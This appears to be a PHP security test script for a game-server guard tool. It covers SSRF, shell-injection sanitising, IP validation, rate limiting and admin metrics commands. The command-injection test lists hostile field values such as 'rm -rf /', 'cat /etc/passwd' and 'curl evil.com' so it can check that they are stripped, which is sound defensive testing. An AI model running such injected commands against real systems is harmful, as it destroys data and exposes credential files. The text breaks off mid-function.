#!/usr/bin/env php
<?php

declare(strict_types=1);

require_once __DIR__ . '/src/autoload.php';

use AAGuard\ActionRegistry;
use AAGuard\Guard;
use AAGuard\GuardConfig;
use AAGuard\IpInfoClient;
use AAGuard\Logger;
use AAGuard\Matcher;
use AAGuard\Metrics;

class SecurityTestRunner
{
    private int $passed = 0;
    private int $failed = 0;
    private array $failures = [];

    public function assert(bool $condition, string $message): void
    {
        if ($condition) {
            $this->passed++;
            echo "✓ {$message}\n";
        } else {
            $this->failed++;
            $this->failures[] = $message;
            echo "✗ {$message}\n";
        }
    }

    public function assertEquals($expected, $actual, string $message): void
    {
        $this->assert($expected === $actual, $message . " (expected: " . var_export($expected, true) . ", got: " . var_export($actual, true) . ")");
    }

    public function assertNotEquals($expected, $actual, string $message): void
    {
        $this->assert($expected !== $actual, $message);
    }

    public function assertContains(string $needle, string $haystack, string $message): void
    {
        $this->assert(str_contains($haystack, $needle), $message);
    }

    public function assertNotContains(string $needle, string $haystack, string $message): void
    {
        $this->assert(!str_contains($haystack, $needle), $message);
    }

    public function report(): int
    {
        echo "\n" . str_repeat("=", 60) . "\n";
        echo "Test Results: {$this->passed} passed, {$this->failed} failed\n";
        
        if ($this->failed > 0) {
            echo "\nFailed tests:\n";
            foreach ($this->failures as $failure) {
                echo "  - {$failure}\n";
            }
            return 1;
        }
        
        echo "\n✓ All tests passed!\n";
        return 0;
    }
}

$test = new SecurityTestRunner();

echo "Testing Security Fixes\n";
echo str_repeat("=", 60) . "\n\n";

// ===================================================================
// Test 1: SSRF Protection - IpInfoClient validates private IPs
// ===================================================================
echo "Test 1: SSRF Protection in IpInfoClient\n";
echo str_repeat("-", 60) . "\n";

$client = new IpInfoClient('https://ipinfo.io', null, 2);

// Test invalid IPs
$result = $client->fetchNetworkName('999.999.999.999');
$test->assertEquals(false, $result['success'], "Rejects invalid IP 999.999.999.999");
$test->assertEquals('invalid_ip', $result['error'], "Returns invalid_ip error");

$result = $client->fetchNetworkName('not-an-ip');
$test->assertEquals(false, $result['success'], "Rejects non-IP string");
$test->assertEquals('invalid_ip', $result['error'], "Returns invalid_ip error for non-IP");

// Test private IPs (SSRF protection)
$privateIps = [
    '10.0.0.1' => 'Private Class A',
    '172.16.0.1' => 'Private Class B',
    '192.168.1.1' => 'Private Class C',
    '127.0.0.1' => 'Loopback',
    '169.254.1.1' => 'Link-local',
];

foreach ($privateIps as $ip => $desc) {
    $result = $client->fetchNetworkName($ip);
    $test->assertEquals(false, $result['success'], "Rejects private IP {$ip} ({$desc})");
    $test->assertEquals('private_ip', $result['error'], "Returns private_ip error for {$ip}");
}

// Test reserved IPs
$result = $client->fetchNetworkName('0.0.0.0');
$test->assertEquals(false, $result['success'], "Rejects reserved IP 0.0.0.0");

// Test IPv6 rejection (not supported)
$result = $client->fetchNetworkName('2001:4860:4860::8888');
$test->assertEquals(false, $result['success'], "Rejects IPv6 addresses");
$test->assertEquals('invalid_ip', $result['error'], "Returns invalid_ip for IPv6");

echo "\n";

// ===================================================================
// Test 2: Command Injection Protection - ActionRegistry sanitizes
// ===================================================================
echo "Test 2: Command Injection Protection in ActionRegistry\n";
echo str_repeat("-", 60) . "\n";

$commands = [];
$emitter = function (string $command) use (&$commands): void {
    $commands[] = $command;
};

$registry = new ActionRegistry($emitter);

// Test dangerous shell metacharacters
$dangerousInputs = [
    'player_id' => 'hacker; rm -rf /',
    'display_name' => 'evil$(whoami)',
    'ip' => '1.2.3.4|cat /etc/passwd',
    'network_name' => 'VPN`id`',
    'country' => 'US&& curl evil.com',
];

$commands = [];
$registry->executeTemplates(['KICK {{player_id}} {{display_name}}'], $dangerousInputs);

$test->assertEquals(1, count($commands), "Executes one command");
$command = $commands[0];

$test->assertNotContains(';', $command, "Removes semicolon");
$test->assertNotContains('$', $command, "Removes dollar sign");
$test->assertNotContains('|', $command, "Removes pipe");
$test->assertNotContains('`', $command, "Removes backtick");
$test->assertNotContains('&', $command, "Removes ampersand");
$test->assertNotContains('(', $command, "Removes parenthesis");

// Test safe characters are preserved
$safeInputs = [
    'player_id' => 'player_123',
    'display_name' => 'Player-One',
    'email' => 'admin@example.com',
];

$commands = [];
$registry->executeTemplates(['MESSAGE {{player_id}} {{display_name}} {{email}}'], $safeInputs);

$command = $commands[0];
$test->assertContains('player_123', $command, "Preserves alphanumeric with underscore");
$test->assertContains('Player-One', $command, "Preserves dash");
$test->assertContains('admin@example.com', $command, "Preserves @ symbol");

// Test control character removal
$inputWithControl = ['player_id' => "player\x00\x01\x1F\x7F123"];
$commands = [];
$registry->executeTemplates(['KICK {{player_id}}'], $inputWithControl);
$command = $commands[0];
$test->assertContains('player123', $command, "Removes control characters");
$test->assertNotContains("\x00", $command, "Removes null byte");

echo "\n";

// ===================================================================
// Test 3: IP Validation in Guard - filter_var instead of regex
// ===================================================================
echo "Test 3: Strong IP Validation in Guard\n";
echo str_repeat("-", 60) . "\n";

$ipInfoClient = new IpInfoClient('https://ipinfo.io', null, 2);
$matcher = new Matcher([['name' => 'test', 'pattern' => '/test/']]);
$actions = new ActionRegistry(fn($cmd) => null);
$logger = new Logger();

$guard = new Guard(
    $ipInfoClient,
    $matcher,
    $actions,
    $logger,
    new GuardConfig(
        adminRecipients:     [],
        onConnectMessageTemplate: '{{player_id}} is connecting from {{country_name}} ({{country_code}}), network: {{network_name}}.',
        onConnectActions:    [],
        onMatchActions:      [],
        retryDelaysMs:       [100],
        maxAttempts:         3,
        cacheTtlSeconds:     1800,
        dedupeWindowSeconds: 15,
    ),
    new Metrics()
);

// Use reflection to test private method
$reflection = new ReflectionClass($guard);
$method = $reflection->getMethod('parsePlayerEnteredGrid');
$method->setAccessible(true);

// Test valid parsing
$result = $method->invoke($guard, 'PLAYER_ENTERED_GRID player_1 8.8.8.8 Player One');
$test->assertEquals(true, is_array($result), "Parses valid log line");
$test->assertEquals('player_1', $result['playerId'] ?? null, "Extracts player ID");
$test->assertEquals('8.8.8.8', $result['ip'] ?? null, "Extracts IP");
$test->assertEquals('Player One', $result['displayName'] ?? null, "Extracts display name");

// Test invalid IPs are rejected
$invalidIps = ['999.999.999.999', '256.1.1.1', '1.2.3.999', 'not-an-ip', '1.2.3'];

foreach ($invalidIps as $invalidIp) {
    $result = $method->invoke($guard, "PLAYER_ENTERED_GRID player_1 {$invalidIp} Player");
    $test->assertEquals(null, $result, "Rejects invalid IP: {$invalidIp}");
}

// Test valid public IPs are accepted
$validIps = ['8.8.8.8', '1.1.1.1', '93.184.216.34'];

foreach ($validIps as $validIp) {
    $result = $method->invoke($guard, "PLAYER_ENTERED_GRID player_1 {$validIp} Player");
    $test->assertEquals(true, is_array($result), "Accepts valid IP: {$validIp}");
    $test->assertEquals($validIp, $result['ip'] ?? null, "Correctly extracts IP: {$validIp}");
}

echo "\n";

// ===================================================================
// Test 3b: Remote command parsing for /guard metrics
// ===================================================================
echo "Test 3b: Remote Command Parsing\n";
echo str_repeat("-", 60) . "\n";

$parseInvalidCommand = $reflection->getMethod('parseInvalidCommand');
$parseInvalidCommand->setAccessible(true);

// Layout 1: INVALID_COMMAND <command> <player_id> <player_ip> <player_level> [args]
$remote1 = $parseInvalidCommand->invoke($guard, 'INVALID_COMMAND /guard admin_1 8.8.8.8 2 metrics');
$test->assertEquals(true, is_array($remote1), "Parses layout 1 with slash command");
$test->assertEquals('guard', $remote1['commandName'] ?? null, "Normalizes /guard to guard");
$test->assertEquals('metrics', $remote1['commandArgs'] ?? null, "Extracts metrics subcommand from layout 1");

// Layout 2: INVALID_COMMAND <player_id> <player_ip> <player_level> <command> [args]
$remote2 = $parseInvalidCommand->invoke($guard, 'INVALID_COMMAND admin_1 8.8.8.8 2 guard metrics');
$test->assertEquals(true, is_array($remote2), "Parses layout 2 with command after level");
$test->assertEquals('guard', $remote2['commandName'] ?? null, "Extracts guard command from layout 2");
$test->assertEquals('metrics', $remote2['commandArgs'] ?? null, "Extracts metrics subcommand from layout 2");

echo "\n";

// ===================================================================
// Test 4: ReDoS Protection - Matcher handles errors properly
// ===================================================================
echo "Test 4: ReDoS Protection in Matcher\n";
echo str_repeat("-", 60) . "\n";

// Test basic matching
$matcher = new Matcher([['name' => 'VPN', 'pattern' => '/vpn/i']]);
$result = $matcher->match('Some VPN Service');
$test->assertEquals(true, $result['matched'], "Matches VPN pattern");
$test->assertEquals('VPN', $result['ruleName'], "Returns correct rule name");

// Test no match
$result = $matcher->match('Regular ISP');
$test->assertEquals(false, $result['matched'], "No match for non-VPN");
$test->assertEquals(null, $result['ruleName'], "Returns null rule name");

// Test invalid regex handling (no @ suppression)
$matcher = new Matcher([
    ['name' => 'Invalid', 'pattern' => '/[invalid/'],
    ['name' => 'Valid', 'pattern' => '/vpn/i'],
]);

$result = $matcher->match('VPN Service');
$test->assertEquals(true, $result['matched'], "Skips invalid regex and continues");
$test->assertEquals('Valid', $result['ruleName'], "Matches with valid pattern after invalid");

// Test case-insensitive
$matcher = new Matcher([['name' => 'VPN', 'pattern' => '/vpn/i']]);
foreach (['VPN', 'vpn', 'Vpn'] as $variant) {
    $result = $matcher->match($variant);
    $test->assertEquals(true, $result['matched'], "Case-insensitive match for {$variant}");
}

// Test complex patterns
$matcher = new Matcher([['name' => 'Cloud', 'pattern' => '/(cloud|hosting|datacenter)/i']]);
$test->assertEquals(true, $matcher->match('Cloud Services')['matched'], "Matches cloud");
$test->assertEquals(true, $matcher->match('Hosting Provider')['matched'], "Matches hosting");
$test->assertEquals(false, $matcher->match('Regular ISP')['matched'], "No match for regular");

echo "\n";

// ===================================================================
// Test 5: Config validation (from aa_guard.php changes)
// ===================================================================
echo "Test 5: Config Validation\n";
echo str_repeat("-", 60) . "\n";

// Test that the validation code exists in aa_guard.php
$scriptContent = file_get_contents(__DIR__ . '/bin/aa_guard.php');
$test->assertContains('Validate each rule has required fields', $scriptContent, "Config validation comment exists");
$test->assertContains("is_string(\$rule['name'])", $scriptContent, "Validates rule name is string");
$test->assertContains("is_string(\$rule['pattern'])", $scriptContent, "Validates rule pattern is string");
$test->assertContains('@preg_match($rule[\'pattern\']', $scriptContent, "Tests regex pattern validity");

echo "\n";

// ===================================================================
// Test 6: Rate Limiting in IpInfoClient
// ===================================================================
echo "Test 6: Rate Limiting in IpInfoClient\n";
echo str_repeat("-", 60) . "\n";

// rateLimit=0 means no calls allowed — immediately rate limited
$rateLimitedClient = new IpInfoClient('https://ipinfo.io', null, 2, 0);

$result = $rateLimitedClient->fetchNetworkName('8.8.8.8');
$test->assertEquals(false, $result['success'], "Rate limited client returns failure");
$test->assertEquals('rate_limited', $result['error'], "Rate limited client returns rate_limited error");
$test->assertEquals(true, $rateLimitedClient->isRateLimited(), "isRateLimited() returns true");
$retryMs = $rateLimitedClient->getRateLimitRetryAfterMs();
$test->assertEquals(true, $retryMs > 0, "getRateLimitRetryAfterMs() returns positive value ({$retryMs}ms)");
$test->assertEquals(true, $retryMs <= 60000, "getRateLimitRetryAfterMs() <= 60s");

// rateLimit=1 allows exactly one call, second is rate limited (uses invalid IP to avoid real API call)
$oneCallClient = new IpInfoClient('https://ipinfo.io', null, 2, 1);
$result1 = $oneCallClient->fetchNetworkName('999.999.999.999'); // rejected before rate limit check
$test->assertEquals('invalid_ip', $result1['error'], "Invalid IP rejected before rate limiter");
$test->assertEquals(false, $oneCallClient->isRateLimited(), "Rate limiter not decremented for invalid IP");

// isRateLimited() returns true AFTER a call that was rate limited (window is then initialized)
$client2 = new IpInfoClient('https://ipinfo.io', null, 2, 0);
$client2->fetchNetworkName('8.8.8.8'); // triggers window init + rate limit
$test->assertEquals(true, $client2->isRateLimited(), "isRateLimited() true after rate-limited call");

echo "\n";

// ===================================================================
// Test 7: Metrics counters
// ===================================================================
echo "Test 7: Metrics counters\n";
echo str_repeat("-", 60) . "\n";

$metrics = new Metrics();
$test->assertEquals(0, $metrics->bans, "Metrics starts at zero: bans");
$test->assertEquals(0, $metrics->lookups, "Metrics starts at zero: lookups");
$test->assertEquals(0, $metrics->cacheHits, "Metrics starts at zero: cacheHits");
$test->assertEquals(0, $metrics->apiErrors, "Metrics starts at zero: apiErrors");
$test->assertEquals(0, $metrics->rateLimited, "Metrics starts at zero: rateLimited");
$test->assertEquals(0, $metrics->invalidIps, "Metrics starts at zero: invalidIps");

// Rate limited call increments rateLimited counter
$mClient = new IpInfoClient('https://ipinfo.io', null, 2, 0, $metrics);
$mClient->fetchNetworkName('8.8.8.8');
$test->assertEquals(1, $metrics->rateLimited, "Rate limited call increments rateLimited counter");
$test->assertEquals(0, $metrics->lookups, "Rate limited call does not increment lookups");

// Invalid IP rejected before rate limiter — does NOT increment any IpInfoClient counter
$metrics2 = new Metrics();
$mClient2 = new IpInfoClient('https://ipinfo.io', null, 2, 30, $metrics2);
$mClient2->fetchNetworkName('999.999.999.999'); // invalid_ip returned before rate limit check
$test->assertEquals(0, $metrics2->rateLimited, "Invalid IP does not increment rateLimited");
$test->assertEquals(0, $metrics2->lookups, "Invalid IP does not increment lookups");

// Metrics toTemplateContext returns all expected keys
$ctx = $metrics->toTemplateContext();
$test->assertEquals(true, isset($ctx['bans']), "Template context has bans key");
$test->assertEquals(true, isset($ctx['lookups']), "Template context has lookups key");
$test->assertEquals(true, isset($ctx['cache_hits']), "Template context has cache_hits key");
$test->assertEquals(true, isset($ctx['api_errors']), "Template context has api_errors key");
$test->assertEquals(true, isset($ctx['rate_limited']), "Template context has rate_limited key");
$test->assertEquals(true, isset($ctx['invalid_ips']), "Template context has invalid_ips key");
$test->assertEquals(true, isset($ctx['last_action_who']), "Template context has last_action_who key");
$test->assertEquals(true, isset($ctx['last_action_why']), "Template context has last_action_why key");
$test->assertEquals(true, isset($ctx['runtime']), "Template context has runtime key");
$test->assertEquals(true, preg_match('/^\d+(?:y|mo|d|h|m)(?: \d+(?:y|mo|d|h|m))*$/', $ctx['runtime']) === 1, "runtime has dynamic human-readable format");
$test->assertEquals(false, str_contains($ctx['runtime'], 's'), "runtime omits seconds");

// Runtime formatting test for deterministic duration
$metricsRuntime = new Metrics();
$metricsRuntimeReflection = new ReflectionClass($metricsRuntime);
$startedAtProperty = $metricsRuntimeReflection->getProperty('startedAt');
$startedAtProperty->setAccessible(true);
$runtimeSeconds = (246 * 86400) + (21 * 3600) + (35 * 60) + 17;
$startedAtProperty->setValue($metricsRuntime, microtime(true) - $runtimeSeconds);
$runtimeCtx = $metricsRuntime->toTemplateContext();
$test->assertEquals('8mo 6d 21h 35m', $runtimeCtx['runtime'], "runtime format matches expected dynamic y/mo/d/h/m output");

// Runtime under one minute should still emit minutes unit
$metricsUnderMinute = new Metrics();
$metricsUnderMinuteReflection = new ReflectionClass($metricsUnderMinute);
$underMinuteStartedAtProperty = $metricsUnderMinuteReflection->getProperty('startedAt');
$underMinuteStartedAtProperty->setAccessible(true);
$underMinuteStartedAtProperty->setValue($metricsUnderMinute, microtime(true) - 42);
$underMinuteCtx = $metricsUnderMinute->toTemplateContext();
$test->assertEquals('0m', $underMinuteCtx['runtime'], "runtime under one minute is shown as 0m");

// Metrics toLogString returns a non-empty string
$logStr = $metrics->toLogString();
$test->assertEquals(true, str_contains($logStr, 'bans='), "toLogString contains bans");
$test->assertEquals(true, str_contains($logStr, 'lookups='), "toLogString contains lookups");
$test->assertEquals(true, str_contains($logStr, 'last_action_who='), "toLogString contains last_action_who");
$test->assertEquals(true, str_contains($logStr, 'last_action_why='), "toLogString contains last_action_why");
$test->assertEquals(true, str_contains($logStr, 'runtime='), "toLogString contains runtime");

$metrics->recordLastAction('player_x', 'vpn');
$ctxAfterAction = $metrics->toTemplateContext();
$test->assertEquals('player_x', $ctxAfterAction['last_action_who'] ?? null, 'recordLastAction stores last_action_who');
$test->assertEquals('vpn', $ctxAfterAction['last_action_why'] ?? null, 'recordLastAction stores last_action_why');

echo "\n";

// ===================================================================
// Test 8: Startup broadcast and onConnect message context
// ===================================================================
echo "Test 8: Startup broadcast and onConnect context\n";
echo str_repeat("-", 60) . "\n";

$scriptContent = file_get_contents(__DIR__ . '/bin/aa_guard.php');
$test->assertContains("actions']['onStartup", $scriptContent, "Startup template is loaded from config actions.onStartup");
$actionsConfig = json_decode((string) file_get_contents(__DIR__ . '/config/actions.json'), true);
$test->assert(in_array('LADDERLOG_WRITE_INVALID_COMMAND 1', $actionsConfig['onStartup'] ?? [], true), 'Startup actions enable INVALID_COMMAND ladderlog writes');
$test->assert(in_array('LADDERLOG_WRITE_PLAYER_LEFT 1', $actionsConfig['onStartup'] ?? [], true), 'Startup actions enable PLAYER_LEFT ladderlog writes');

$countryClient = new IpInfoClient('https://ipinfo.io', null, 2);
$countryReflection = new ReflectionClass($countryClient);
$extractCountryNameMethod = $countryReflection->getMethod('extractCountryName');
$extractCountryNameMethod->setAccessible(true);
$fallbackCountryName = $extractCountryNameMethod->invoke($countryClient, ['country' => 'BY']);
$test->assertEquals('Belarus', $fallbackCountryName, "Fallback resolves country code to full country name");

$onConnectCommands = [];
$onConnectRegistry = new ActionRegistry(function (string $command) use (&$onConnectCommands): void {
    $onConnectCommands[] = $command;
});

$guardForConnect = new Guard(
    new IpInfoClient('https://ipinfo.io', null, 2),
    new Matcher([['name' => 'never-match', 'pattern' => '/^$/']]),
    $onConnectRegistry,
    new Logger(),
    new GuardConfig(
        adminRecipients: ['AdminOne'],
        onConnectMessageTemplate: '{{player_id}} is connecting from {{country_name}} ({{country_code}}), network: {{network_name}}.',
        onConnectActions: [
            '# CONSOLE_MESSAGE {{player_id}} is connecting from {{country_name}} ({{country_code}}), network: {{network_name}}.',
            'PLAYER_MESSAGE {{admin}} "{{msg}}"',
        ],
        onMatchActions: [],
        retryDelaysMs: [100],
        maxAttempts: 1,
        cacheTtlSeconds: 1800,
        dedupeWindowSeconds: 15,
    ),
    new Metrics()
);

$guardReflection = new ReflectionClass($guardForConnect);
$cacheProperty = $guardReflection->getProperty('ipCache');
$cacheProperty->setAccessible(true);
$cacheProperty->setValue($guardForConnect, [
    '8.8.8.8' => [
        'networkName' => 'Orange Polska S.A.',
        'country' => 'Poland',
        'countryCode' => 'PL',
        'countryName' => 'Poland',
        'expiresAt' => microtime(true) + 60,
    ],
]);

$guardForConnect->handleLogLine('PLAYER_ENTERED_GRID player_one 8.8.8.8 Player One');

$test->assertEquals(2, count($onConnectCommands), "onConnect emits console and admin messages");
$test->assertContains('Poland (PL)', $onConnectCommands[0] ?? '', "CONSOLE_MESSAGE includes full country name and code");
$test->assertContains('Orange Polska S.A.', $onConnectCommands[0] ?? '', "CONSOLE_MESSAGE includes as-name/network");
$test->assertContains('Poland (PL)', $onConnectCommands[1] ?? '', "PLAYER_MESSAGE includes full country name and code");
$test->assertContains('Orange Polska S.A.', $onConnectCommands[1] ?? '', "PLAYER_MESSAGE includes as-name/network");

$multiAdminCommands = [];
$multiAdminRegistry = new ActionRegistry(function (string $command) use (&$multiAdminCommands): void {
    $multiAdminCommands[] = $command;
});

$guardForMultiAdmin = new Guard(
    new IpInfoClient('https://ipinfo.io', null, 2),
    new Matcher([['name' => 'never-match', 'pattern' => '/^$/']]),
    $multiAdminRegistry,
    new Logger(),
    new GuardConfig(
        adminRecipients: ['AdminOne', 'AdminTwo'],
        onConnectMessageTemplate: '{{player_id}} is connecting from {{country_name}} ({{country_code}}), network: {{network_name}}.',
        onConnectActions: [
            '# CONSOLE_MESSAGE {{player_id}} is connecting from {{country_name}} ({{country_code}}), network: {{network_name}}.',
            'PLAYER_MESSAGE {{admin}} "{{msg}}"',
        ],
        onMatchActions: [],
        retryDelaysMs: [100],
        maxAttempts: 1,
        cacheTtlSeconds: 1800,
        dedupeWindowSeconds: 15,
    ),
    new Metrics()
);

$multiGuardReflection = new ReflectionClass($guardForMultiAdmin);
$multiCacheProperty = $multiGuardReflection->getProperty('ipCache');
$multiCacheProperty->setAccessible(true);
$multiCacheProperty->setValue($guardForMultiAdmin, [
    '1.1.1.1' => [
        'networkName' => 'Cloudflare, Inc.',
        'country' => 'Australia',
        'countryCode' => 'AU',
        'countryName' => 'Australia',
        'expiresAt' => microtime(true) + 60,
    ],
]);

$guardForMultiAdmin->handleLogLine('PLAYER_ENTERED_GRID player_two 1.1.1.1 Player Two');

$test->assertEquals(3, count($multiAdminCommands), "One console message and two admin messages are emitted for two admins");
$test->assertContains('# CONSOLE_MESSAGE', $multiAdminCommands[0] ?? '', "First command is single CONSOLE_MESSAGE");
$test->assertContains('AdminOne', $multiAdminCommands[1] ?? '', "Second command targets first admin");
$test->assertContains('AdminTwo', $multiAdminCommands[2] ?? '', "Third command targets second admin");

echo "\n";

// ===================================================================
// Test 9: Debug forwarding to admins for all levels
// ===================================================================
echo "Test 9: Debug forwarding in Logger\n";
echo str_repeat("-", 60) . "\n";

$forwardedMessages = [];
$loggerWithForwarding = new Logger(static function (string $level, string $message) use (&$forwardedMessages): void {
    $forwardedMessages[] = ['level' => $level, 'message' => $message];
});

$loggerWithForwarding->debug('Debug message for admins (network=P4 Sp. z o.o.=true)');
$loggerWithForwarding->warning('Warning should be forwarded');
$loggerWithForwarding->error('Error should be forwarded');

$test->assertEquals(3, count($forwardedMessages), "DEBUG, WARN and ERROR messages are forwarded");
$test->assertEquals('DEBUG', $forwardedMessages[0]['level'] ?? null, "DEBUG level is preserved");
$test->assertEquals('WARN', $forwardedMessages[1]['level'] ?? null, "WARN level is preserved");
$test->assertEquals('ERROR', $forwardedMessages[2]['level'] ?? null, "ERROR level is preserved");
$test->assertEquals('Debug message for admins (network=P4 Sp. z o.o.=true)', $forwardedMessages[0]['message'] ?? null, "Forwarded DEBUG message content is preserved");

$debugCommands = [];
$debugRegistry = new ActionRegistry(function (string $command) use (&$debugCommands): void {
    $debugCommands[] = $command;
});

$forwardingCallback = static function (string $level, string $message) use ($debugRegistry): void {
    $debugRegistry->executeTemplatesWithRawValues([
        'PLAYER_MESSAGE {{admin}} "0xff0000>> 0x888888[GUARD] 0xffffff [{{level}}] {{msg}}"',
    ], [
        'admin' => 'P4@thefarm51.com',
        'level' => $level,
        'msg' => $message,
    ], ['msg']);
};

$forwardingCallback('WARN', 'Warning message (network=P4 Sp. z o.o.=true) "quoted"');

$test->assertEquals(1, count($debugCommands), "Forwarded template emits one command");
$test->assertContains('[WARN]', $debugCommands[0], "Forwarded message includes level tag");
$test->assertContains('(network=P4 Sp. z o.o.=true)', $debugCommands[0], "Preserves parentheses and equals in debug message");
$test->assertContains('\\"quoted\\"', $debugCommands[0], "Escapes quoted text in debug message");

$forwardedWithoutCallback = [];
$loggerWithoutForwarding = new Logger();
$loggerWithoutForwarding->debug('Debug without callback');
$test->assertEquals(0, count($forwardedWithoutCallback), "Logger works without debug forwarding callback");

echo "\n";

// ===================================================================
// Test 9b: Remote command metrics
// ===================================================================
echo "Test 9b: Remote command metrics\n";
echo str_repeat("-", 60) . "\n";

$buildGuardForRemoteCommandTest = function (array $adminRecipients, array &$emittedCommands, Metrics $metrics): Guard {
    $emittedCommands = [];
    $actionRegistry = new ActionRegistry(function (string $command) use (&$emittedCommands): void {
        $emittedCommands[] = $command;
    });

    return new Guard(
        new IpInfoClient('https://ipinfo.io', null, 2, 0, $metrics),
        new Matcher([]),
        $actionRegistry,
        new Logger(),
        new GuardConfig(
            adminRecipients:     $adminRecipients,
            onConnectMessageTemplate: '{{player_id}} joined from {{country_name}}',
            onConnectActions:    ['PLAYER_MESSAGE {{admin}} "{{msg}}"'],
            onMatchActions:      [],
            retryDelaysMs:       [100],
            maxAttempts:         1,
            cacheTtlSeconds:     60,
            dedupeWindowSeconds: 15,
            onMetricsActions:    ['PLAYER_MESSAGE {{admin}} "bans={{bans}} lookups={{lookups}} invalidIps={{invalid_ips}} runtime={{runtime}}"'],
        ),
        $metrics
    );
};

$remoteParseMetrics = new Metrics();
$remoteParseCommands = [];
$remoteParseGuard = $buildGuardForRemoteCommandTest(['internal_admin'], $remoteParseCommands, $remoteParseMetrics);
$remoteReflection = new ReflectionClass($remoteParseGuard);
$parseInvalidCommandMethod = $remoteReflection->getMethod('parseInvalidCommand');
$parseInvalidCommandMethod->setAccessible(true);

$parsedRemoteCommand = $parseInvalidCommandMethod->invoke(
    $remoteParseGuard,
    'INVALID_COMMAND guard internal_admin 8.8.8.8 2 metrics now please'
);
$test->assertEquals(true, is_array($parsedRemoteCommand), 'Parses valid INVALID_COMMAND line');
$test->assertEquals('guard', $parsedRemoteCommand['commandName'] ?? null, 'Extracts remote command name');
$test->assertEquals('internal_admin', $parsedRemoteCommand['playerId'] ?? null, 'Extracts remote command player id');
$test->assertEquals('8.8.8.8', $parsedRemoteCommand['playerIp'] ?? null, 'Extracts remote command player ip');
$test->assertEquals(2, $parsedRemoteCommand['playerLevel'] ?? null, 'Extracts remote command player level');
$test->assertEquals('metrics now please', $parsedRemoteCommand['commandArgs'] ?? null, 'Preserves remote command arguments with spaces');

$malformedRemoteLines = [
    'INVALID_COMMAND guard internal_admin 8.8.8.8 metrics',
    'INVALID_COMMAND guard internal_admin 8.8.8.8 not-a-number metrics',
    'INVALID_COMMAND guard internal_admin not-an-ip 2 metrics',
];

foreach ($malformedRemoteLines as $malformedRemoteLine) {
    $test->assertEquals(
        null,
        $parseInvalidCommandMethod->invoke($remoteParseGuard, $malformedRemoteLine),
        "Rejects malformed INVALID_COMMAND line: {$malformedRemoteLine}"
    );
}

$internalAdminMetrics = new Metrics();
$internalAdminMetrics->bans = 3;
$internalAdminMetrics->lookups = 5;
$internalAdminMetrics->invalidIps = 1;
$internalAdminCommands = [];
$internalAdminGuard = $buildGuardForRemoteCommandTest(['internal_admin', 'other_admin'], $internalAdminCommands, $internalAdminMetrics);
$internalAdminGuard->handleLogLine('INVALID_COMMAND guard internal_admin 8.8.8.8 0 metrics');

$test->assertEquals(1, count($internalAdminCommands), 'Internal admin metrics request emits one command');
$test->assertContains('PLAYER_MESSAGE internal_admin', $internalAdminCommands[0] ?? '', 'Internal admin metrics target the requester');
$test->assertNotContains('other_admin', $internalAdminCommands[0] ?? '', 'Internal admin metrics do not target other admins');
$test->assertContains('bans=3', $internalAdminCommands[0] ?? '', 'Internal admin metrics include counters');

$moderatorMetrics = new Metrics();
$moderatorMetrics->bans = 4;
$moderatorCommands = [];
$moderatorGuard = $buildGuardForRemoteCommandTest(['internal_admin'], $moderatorCommands, $moderatorMetrics);
$moderatorGuard->handleLogLine('INVALID_COMMAND guard moderator_user 8.8.4.4 2 metrics');

$test->assertEquals(1, count($moderatorCommands), 'Moderator metrics request emits one command');
$test->assertContains('PLAYER_MESSAGE moderator_user', $moderatorCommands[0] ?? '', 'Moderator metrics target the requesting moderator');

$unauthorizedMetrics = new Metrics();
$unauthorizedCommands = [];
$unauthorizedGuard = $buildGuardForRemoteCommandTest(['internal_admin'], $unauthorizedCommands, $unauthorizedMetrics);
$unauthorizedGuard->handleLogLine('INVALID_COMMAND guard regular_user 8.8.8.8 1 metrics');
$test->assertEquals(0, count($unauthorizedCommands), 'Unauthorized remote metrics request is ignored silently');

$unknownRemoteMetrics = new Metrics();
$unknownRemoteCommands = [];
$unknownRemoteGuard = $buildGuardForRemoteCommandTest(['internal_admin'], $unknownRemoteCommands, $unknownRemoteMetrics);
$unknownRemoteGuard->handleLogLine('INVALID_COMMAND guard internal_admin 8.8.8.8 2 status');
$test->assertEquals(0, count($unknownRemoteCommands), 'Unknown remote guard subcommand is ignored silently');

$playersMetrics = new Metrics();
$playersCommands = [];
$playersGuard = $buildGuardForRemoteCommandTest(['internal_admin'], $playersCommands, $playersMetrics);

$playersReflection = new ReflectionClass($playersGuard);
$playersCacheProperty = $playersReflection->getProperty('ipCache');
$playersCacheProperty->setAccessible(true);
$playersCacheProperty->setValue($playersGuard, [
    '8.8.8.8' => [
        'networkName' => 'Example ISP',
        'country' => 'United States',
        'countryCode' => 'US',
        'countryName' => 'United States',
        'expiresAt' => microtime(true) + 60,
    ],
]);

$playersGuard->handleLogLine('PLAYER_ENTERED_GRID player_1 8.8.8.8 Player One');
$playersGuard->handleLogLine('INVALID_COMMAND guard internal_admin 8.8.8.8 2 players');

$playerListCommands = array_values(array_filter(
    $playersCommands,
    static fn (string $command): bool => str_contains($command, 'player_id=player_1')
));

$test->assertEquals(1, count($playerListCommands), 'Remote players command emits one line per tracked player');
$test->assertContains('PLAYER_MESSAGE internal_admin', $playerListCommands[0] ?? '', 'Remote players response targets requester only');
$test->assertContains('player_name=Player One', $playerListCommands[0] ?? '', 'Remote players response includes player_name');
$test->assertContains('player_country=United States', $playerListCommands[0] ?? '', 'Remote players response includes player_country');
$test->assertContains('player_network=Example ISP', $playerListCommands[0] ?? '', 'Remote players response includes player_network');

$playersCommands = [];
$playersGuard->handleLogLine('PLAYER_LEFT player_1 8.8.8.8 Player One');
$playersGuard->handleLogLine('INVALID_COMMAND guard internal_admin 8.8.8.8 2 players');

$test->assertEquals(1, count($playersCommands), 'Remote players command emits one response when list is empty');
$test->assertContains('No tracked players online.', $playersCommands[0] ?? '', 'Remote players command reports empty tracked list after PLAYER_LEFT');

$remoteJoinMetrics = new Metrics();
$remoteJoinCommands = [];
$remoteJoinGuard = $buildGuardForRemoteCommandTest(['internal_admin'], $remoteJoinCommands, $remoteJoinMetrics);
$remoteJoinGuard->handleLogLine('PLAYER_ENTERED_GRID player_three 8.8.8.8 Player Three');
$test->assert(count($remoteJoinCommands) >= 1, 'PLAYER_ENTERED_GRID handling still works alongside remote commands');
$test->assertContains('PLAYER_MESSAGE internal_admin', $remoteJoinCommands[0] ?? '', 'Join handling still emits admin-targeted connect message');

echo "\n";

// ===================================================================
// Test 8: Join always emits admin message
// ===================================================================
echo "Test 8: Join emits admin message every time\n";
echo str_repeat("-", 60) . "\n";

$buildGuardForJoinTest = function (array $onConnectActions, array &$emittedCommands): Guard {
    $emittedCommands = [];
